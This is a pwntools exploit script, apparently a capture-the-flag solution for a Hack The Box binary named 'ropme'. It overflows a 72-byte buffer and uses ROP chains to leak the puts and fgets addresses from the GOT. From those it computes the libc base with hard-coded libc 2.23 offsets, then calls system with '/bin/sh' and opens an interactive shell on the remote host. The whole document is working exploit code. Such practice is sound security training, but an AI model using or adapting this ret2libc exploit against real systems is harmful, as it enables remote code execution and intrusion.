from pwn import *

REMOTE = True

IP   = "docker.hackthebox.eu"
PORT = 41305

BUFFER_LEN = 72

if REMOTE:
    p = remote(IP, PORT)
else:
    e = ELF("./ropme")
    p = process(e.path)

junk = b"\x90" * BUFFER_LEN

# Addresses
pop_rdi  = p64(0x4006d3)
puts_plt = p64(0x4004e0)
puts_got = p64(0x601018)
fget_got = p64(0x601028)

main_adr = p64(0x400626)

# ROP Chain #1 - puts
payload = b""
payload += junk
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main_adr

p.sendline(payload)

p.recvuntil("dah?\n")

leaked_puts = u64(p.recvuntil("\n").strip().ljust(8, b"\x00"))
print(f"[!] Leaked puts@GLIC:  {hex(leaked_puts)}")

# ROP Chain #2 - fgets
payload = b""
payload += junk
payload += pop_rdi
payload += fget_got
payload += puts_plt
payload += main_adr

p.sendline(payload)

p.recvuntil("dah?\n")

leaked_fgets = u64(p.recvuntil("\n").strip().ljust(8, b"\x00"))
print(f"[!] Leaked fgets@GLIC: {hex(leaked_fgets)}")
p.recv()

# LIBC calc

# Offsets - libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so
libc_puts   = 0x06f690 
libc_bin    = 0x18cd57 - 64
libc_system = 0x045390

# Finds the offset
libc_addr = leaked_puts - libc_puts
print(f"[!] LIBC: {hex(libc_addr)}")

system = p64(libc_addr + libc_system)
bin_sh = p64(libc_addr + libc_bin)

# ROP Chain #3
payload = b""
payload += junk
payload += pop_rdi
payload += bin_sh
payload += system

p.sendline(payload)
p.interactive()